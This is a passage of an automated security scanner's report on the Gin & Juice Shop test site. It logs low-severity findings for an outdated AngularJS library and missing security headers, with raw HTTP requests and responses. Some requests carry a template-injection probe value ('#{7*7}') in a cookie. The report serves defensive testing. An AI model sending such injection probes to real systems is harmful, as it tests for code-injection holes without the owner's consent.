       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F15] vulnerable_js_dependency — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/resources/js/angular_1-7-7.js (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — End-of-life client-side dependency served — known advisory class applies to every client.
- Evidence chain (engine-recorded):
    * [banner] served asset 'angular_1-7-7.js': AngularJS 1.x — end-of-life branch (Jan 2022); sandbox-escape / client-side template injection class (CVE-2019-10768, CVE-2024-21490)
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f872e7c2 (exactly as issued by the engine) ---
  GET /resources/js/angular_1-7-7.js
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: public, max-age=3600
    connection: keep-alive
    content-length: 195161
    content-type: application/javascript; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:43 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:43 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    /*
     AngularJS v1.7.7
     (c) 2010-2018 Google, Inc. http://angularjs.org
     License: MIT
    */
    (function(C){'use strict';function re(a){if(D(a))w(a.objectMaxDepth)&&(Wb.objectMaxDepth=Xb(a.objectMaxDepth)?a.objectMaxDepth:NaN),w(a.urlErrorParamsEnabled)&&Ga(a.urlErrorParamsEnabled)&&(Wb.urlErrorParamsEnabled=a.urlErrorParamsEnabled);else return Wb}function Xb(a){return W(a)&&0<a}function F(a,b){b=b||Error;return function(){var d=arguments[0],c;c="["+(a?a+":":"")+d+"] http://errors.angularjs.org/1.7.7/"+(a?a+"/":"")+d;for(d=1;d<arguments.length;d++){c=c+(1==d?"?":"&")+"p"+(d-1)+"=";var e=encodeURIComponent,
        f;f=arguments[d];f="function"==typeof f?f.toString().replace(/ \{[\s\S]*$/,""):"undefined"==typeof f?"undefined":"string"!=typeof f?JSON.stringify(f):f;c+=e(f)}return new b(c)}}function ya(a){if(null==a||$a(a))return!1;if(H(a)||A(a)||x&&a instanceof x)return!0;var b="length"in Object(a)&&a.length;return W(b)&&(0<=b&&b-1 in a||"function"===typeof a.item)}function r(a,b,d){var c,e;if(a)if(B(a))for(c in a)"prototype"!==c&&"length"!==c&&"name"!==c&&a.hasOwnProperty(c)&&b.call(d,a[c],c,a);else if(H(a)||
        ya(a)){var f="object"!==typeof a;c=0;for(e=a.length;c<e;c++)(f||c in a)&&b.call(d,a[c],c,a)}else if(a.forEach&&a.forEach!==r)a.forEach(b,d,a);else if(Nc(a))for(c in a)b.call(d,a[c],c,a);else if("function"===typeof a.hasOwnProperty)for(c in a)a.hasOwnProperty(c)&&b.call(d,a[c],c,a);else for(c in a)ta.call(a,c)&&b.call(d,a[c],c,a);return a}function Oc(a,b,d){for(var c=Object.keys(a).sort(),e=0;e<c.length;e++)b.call(d,a[c[e]],c[e]);return c}function Yb(a){return function(b,d){a(d,b)}}function se(){return++pb}
        function Zb(a,b,d){for(var c=a.$$hashKey,e=0,f=b.length;e<f;++e){var g=b[e];if(D(g)||B(g))for(var k=Object.keys(g),h=0,l=k.length;h<l;h++){var m=k[h],p=g[m];d&&D(p)?ha(p)?a[m]=new Date(p.valueOf()):ab(p)?a[m]=new RegExp(p):p.nodeName?a[m]=p.cloneNode(!0):$b(p)?a[m]=p.clone():(D(a[m])||(a[m]=H(p)?[]:{}),Zb(a[m],[p],!0)):a[m]=p}}c?a.$$hashKey=c:delete a.$$hashKey;return a}function S(a){return Zb(a,Ha.call(arguments,1),!1)}function te(a){return Zb(a,Ha.call(arguments,1),!0)}function fa(a){return parseInt(a,
            10)}function ac(a,b){return S(Object.create(a),b)}function E(){}function Ta(a){return a}function ia(a){return function(){return a}}function bc(a){return B(a.toString)&&a.toString!==la}function z(a){return"undefined"===typeof a}function w(a){return"undefined"!==typeof a}function D(a){return null!==a&&"object"===typeof a}function Nc(a){return null!==a&&"object"===typeof a&&!Pc(a)}function A(a){return"string"===typeof a}function W(a){return"number"===typeof a}function ha(a){return"[object Date]"===la.call(a)}
        function H(a){return Array.isArray(a)||a instanceof Array}function cc(a){switch(la.call(a)){case "[object Error]":return!0;case "[object Exception]":return!0;case "[object DOMException]":return!0;default:return a instanceof Error}}function B(a){return"function"===typeof a}function ab(a){return"[object RegExp]"===la.call(a)}function $a(a){return a&&a.window===a}function bb(a){return a&&a.$evalAsync&&a.$watch}function Ga(a){return"boolean"===typeof a}function ue(a){return a&&W(a.length)&&ve.test(la.call(a))}
        function $b(a){return!(!a||!(a.nodeName||a.prop&&a.attr&&a.find))}function we(a){var b={};a=a.split(",");var d;for(d=0;d<a.length;d++)b[a[d]]=!0;return b}function ua(a){return K(a.nodeName||a[0]&&a[0].nodeName)}function cb(a,b){var d=a.indexOf(b);0<=d&&a.splice(d,1);return d}function Ia(a,b,d){function c(a,b,c){c--;if(0>c)return"...";var d=b.$$hashKey,f;if(H(a)){f=0;for(var g=a.length;f<g;f++)b.push(e(a[f],c))}else if(Nc(a))for(f in a)b[f]=e(a[f],c);else if(a&&"function"===typeof a.hasOwnProperty)for(f in a)a.hasOwnProperty(f)&&
    ... [1 more lines, 4000 chars total]
  elapsed_ms: 1635.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/resources/js/angular_1-7-7.js as recorded
       expect: the same evidence kind fires as in the attached proof (banner)

## [GINJUICE F16] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/ (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-b8f05385 (exactly as issued by the engine) ---
  GET /
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 10487
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:45 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:45 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Home - Gin &amp; Juice Shop</title>
        </head>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 826.6
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/ as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F17] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/catalog (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-733b1728 (exactly as issued by the engine) ---
  GET /catalog
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 16840
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:47 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:47 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 1028.3
  --- RAW REQUEST req-5b39a5ad (exactly as issued by the engine) ---
  GET /catalog?searchTerm=1
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 15264
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:08:26 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:08:26 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 1028.7
  --- RAW REQUEST req-0b94829a (exactly as issued by the engine) ---
  GET /catalog?category=Accessories
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 10437
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:08:44 GMT
    set-cookie: category=Accessories; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 825.1
  --- RAW REQUEST req-62b1b8f3 (exactly as issued by the engine) ---
  GET /catalog?category=Accessories&searchTerm=1
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 10503
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:13:20 GMT
    set-cookie: category=Accessories; Secure; HttpOnly
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsEcommerce.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Products - Gin &amp; Juice Shop</title>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 829.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/catalog as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F18] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/blog (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-0b2aa8a0 (exactly as issued by the engine) ---
  GET /blog
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 10965
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:50 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:50 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsBlog.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Blog - Gin &amp; Juice Shop</title>
    ... [61 more lines, 4000 chars total]
  elapsed_ms: 829.5
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/blog as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F19] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/about (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-6b274013 (exactly as issued by the engine) ---
  GET /about
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 11208
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:52 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:52 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Our story - Gin &amp; Juice Shop</title>
        </head>
    ... [62 more lines, 4000 chars total]
  elapsed_ms: 828.7
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/about as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F20] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/my-account (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-fc39a4db (exactly as issued by the engine) ---
  GET /my-account
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 7493
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:56 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:56 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  redirect_chain: [[302, 'https://ginandjuice.shop/login']]
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Login - Gin &amp; Juice Shop</title>
        </head>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 1646.4
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/my-account as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F21] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/catalog/cart (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-e2c91f0e (exactly as issued by the engine) ---
  GET /catalog/cart
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 5144
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:06:59 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:06:59 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Cart - Gin &amp; Juice Shop</title>
        </head>
    ... [60 more lines, 4000 chars total]
  elapsed_ms: 826.0
  --- RAW REQUEST req-cc258edf (exactly as issued by the engine) ---
  POST /catalog/cart
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; category=#{7*7}; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    productId=1&redir=PRODUCT&quantity=1
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 11425
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:11:51 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:11:51 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  redirect_chain: [[302, 'https://ginandjuice.shop/catalog/product?productId=1']]
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Pineapple Edition Cocktail - Product - Gin &amp; Juice Shop</title>
        </head>
    ... [61 more lines, 4000 chars total]
  elapsed_ms: 1654.3
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/catalog/cart as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F22] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/catalog/product (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-c80434cc (exactly as issued by the engine) ---
  GET /catalog/product?productId=4
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 12661
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:07:02 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:07:02 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>Juice Extractor - Product - Gin &amp; Juice Shop</title>
        </head>
    ... [62 more lines, 4000 chars total]
  elapsed_ms: 843.2
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET https://ginandjuice.shop/catalog/product as recorded
       expect: the same evidence kind fires as in the attached proof (header_absent)

## [GINJUICE F23] missing_security_headers — low (engine verdict: verified)

- Surface: GET https://ginandjuice.shop/blog/post (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Protective headers absent — defense-in-depth gap (no browser-enforced XSS/clickjacking/framing protections).
- Evidence chain (engine-recorded):
    * [header_absent] missing: strict-transport-security, content-security-policy, x-content-type-options, referrer-policy
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-ecca76d1 (exactly as issued by the engine) ---
  GET /blog/post?postId=2
  headers:
    Cookie: [REDACTED]; [REDACTED]; TrackingId=eyJ0eXBlIjoiY2xhc3MiLCJ2YWx1ZSI6IldLMnA3M2lSa29jbE9iWGwifQ==; session=YHFOIE491AuIyYuHzApU4F1vTtiWc6v6
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    connection: keep-alive
    content-length: 12131
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:07:16 GMT
    set-cookie: [REDACTED]; Expires=Sat, 10 Oct 2026 01:07:16 GMT; Path=/; SameSite=None; Secure
    x-backend: eccf9fcd-f4c4-476f-af01-a90942cd2f58
    x-frame-options: SAMEORIGIN
  body:
    <!DOCTYPE html>
    <html>
    <!--LAB_HEAD_START-->
        <head>
            <link href=/resources/labheader/css/scanMeHeader.css rel=stylesheet>
            <link href=/resources/css/labsScanme.css rel=stylesheet>
            <meta name="viewport" content="width=device-width, user-scalable=no">
            <script src="/resources/js/react.development.js"></script>
            <script src="/resources/js/react-dom.development.js"></script>
            <script type="text/javascript" src="/resources/js/angular_1-7-7.js"></script>
            <title>The Third Wheel - Blog - Gin &amp; Juice Shop</title>
        </head>
